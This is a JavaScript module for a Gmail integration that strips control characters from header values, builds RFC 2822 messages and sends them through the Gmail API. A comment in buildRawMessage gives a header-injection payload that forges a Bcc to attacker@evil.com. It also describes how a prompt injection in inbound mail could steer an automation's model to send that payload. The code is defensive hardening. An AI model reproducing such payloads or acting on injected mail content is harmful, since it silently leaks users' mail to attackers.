// @typecheck
/**
 * Writing mail: header sanitation, the RFC 2822 message, and sending it.
 */

'use strict';

const log = require('../../telemetry/log');

/**
 * Send a Gmail message directly through the Gmail API. Mirrors the route
 * handler in routes/integrations/gmail.js so the chat path (which uses the
 * route after user approval) and the automation path (which calls this
 * helper) produce identical wire output.
 */
/**
 * Neutralise a value before it becomes part of an RFC 2822 header line.
 *
 * Anything in the C0 range (CR and LF above all, but also NUL/TAB/…) can
 * terminate the current header and forge the next one — the classic mail
 * header-injection primitive. Collapse those runs to a single space rather
 * than rejecting the message: an injected `\r\nBcc: …` degrades to visible
 * text in the subject instead of a delivered blind copy, and a stray newline
 * from a model never fails an automation mid-run. DEL (\x7F) goes too; it has
 * no business in a header either.
 */
function sanitizeHeaderValue(value) {
    if (value === null || value === undefined) return value;
    return String(value).replace(/[\x00-\x1F\x7F]+/g, ' ').trim();
}

/**
 * Build a base64url-encoded RFC 2822 message — the `raw` field shared by
 * messages.send (gmail_compose) and drafts.create (gmail_create_draft).
 * All header values pass through sanitizeHeaderValue first.
 */
function buildRawMessage({ to, cc, bcc, subject, body, userEmail = '', inReplyTo = null, references = null }) {
    // Every value below is interpolated into an RFC 2822 header block joined
    // with CRLF, and every one of them is attacker-reachable: to/cc/bcc/subject
    // come from model arguments (which an automation over inbound mail lets a
    // prompt injection choose), and In-Reply-To/References are lifted off the
    // untrusted message being replied to. A bare CR or LF therefore starts a
    // new header — `subject: "Re: invoice\r\nBcc: attacker@evil.com"` used to
    // produce a real Bcc that messages.send honours, blind-copying the reply
    // with no approval step on the autoSend path.
    to = sanitizeHeaderValue(to);
    cc = sanitizeHeaderValue(cc);
    bcc = sanitizeHeaderValue(bcc);
    subject = sanitizeHeaderValue(subject);
    userEmail = sanitizeHeaderValue(userEmail);
    inReplyTo = sanitizeHeaderValue(inReplyTo);
    references = sanitizeHeaderValue(references);

    const hasNonAscii = /[^\x00-\x7F]/.test(subject || '');
    const encodedSubject = hasNonAscii
        ? `=?UTF-8?B?${Buffer.from(subject || '', 'utf-8').toString('base64')}?=`
        : (subject || '');

    const headers = [
        `To: ${to}`,
        `From: ${userEmail}`,
        `Subject: ${encodedSubject}`,
        'MIME-Version: 1.0',
        'Content-Type: text/plain; charset=UTF-8',
        'Content-Transfer-Encoding: base64',
    ];
    if (cc) headers.push(`Cc: ${cc}`);
    if (bcc) headers.push(`Bcc: ${bcc}`);
    if (inReplyTo) headers.push(`In-Reply-To: ${inReplyTo}`);
    if (references) headers.push(`References: ${references} ${inReplyTo || ''}`);

    const encodedBody = Buffer.from(body || '', 'utf-8').toString('base64');
    const rawMessage = headers.join('\r\n') + '\r\n\r\n' + encodedBody;

    return Buffer.from(rawMessage)
        .toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

async function sendGmailMessage(gmail, { to, cc, bcc, subject, body, userEmail = '', threadId = null, inReplyTo = null, references = null }) {
    const encodedMessage = buildRawMessage({ to, cc, bcc, subject, body, userEmail, inReplyTo, references });

    const sendParams = { userId: 'me', requestBody: { raw: encodedMessage } };
    if (threadId) sendParams.requestBody.threadId = threadId;

    const result = await gmail.users.messages.send(sendParams);
    log.info(`[Gmail] (autoSend) Email sent: ${result.data.id} to ${to}`);
    return { id: result.data.id, threadId: result.data.threadId };
}

module.exports = { sanitizeHeaderValue, buildRawMessage, sendGmailMessage };

/**
 * @typedef {{ to?: string | null, cc?: string | null, bcc?: string | null, subject?: string | null, body?: string,
 *   userEmail?: string, inReplyTo?: string | null, references?: string | null }} MailFields
 */
